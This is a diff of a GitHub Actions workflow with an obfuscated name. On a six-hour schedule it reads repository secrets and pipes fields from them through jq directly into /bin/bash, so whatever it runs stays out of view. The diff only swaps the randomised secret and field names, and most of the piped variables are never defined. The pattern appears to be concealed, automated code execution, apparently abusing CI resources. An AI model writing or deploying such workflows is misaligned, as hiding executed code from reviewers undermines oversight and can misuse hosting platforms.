@@ -1,9 +1,9 @@
 name: huangtaozi6518
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
-
+    - cron: '40 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangtaozi6518
         env:
-          iecg4: ${{ secrets.iecg4 }}
+          himao48738: ${{ secrets.himao48738 }}
         run: |
-          echo $iecg4 | jq -r .wep008 | /bin/bash
-          echo $ffhs18 | jq -r .wlc1 | /bin/bash
-          echo $wtlhf07715 | jq -r .gpgmb1208 | /bin/bash
-          echo $cxn8494 | jq -r .lvl9 | /bin/bash
-          echo $pltui7 | jq -r .hgwr7085 | /bin/bash
-          echo $mkcm63709 | jq -r .jrch6183 | /bin/bash
-          echo $vymiy339 | jq -r .deaw34 | /bin/bash
-          echo $fjie65847 | jq -r .yvcst8708 | /bin/bash
+          echo $himao48738 | jq -r .yjigt80203 | /bin/bash
+          echo $trk233 | jq -r .nbxs3540 | /bin/bash
+          echo $t3014 | jq -r .mcf536 | /bin/bash
+          echo $utm97294 | jq -r .paac71 | /bin/bash
+          echo $xvd816 | jq -r .iww447 | /bin/bash
+          echo $vo998 | jq -r .dbhu22 | /bin/bash
+          echo $h529 | jq -r .iic7928 | /bin/bash
+          echo $n68 | jq -r .bnxuu07031 | /bin/bash
+          echo $n5 | jq -r .nw3 | /bin/bash
 
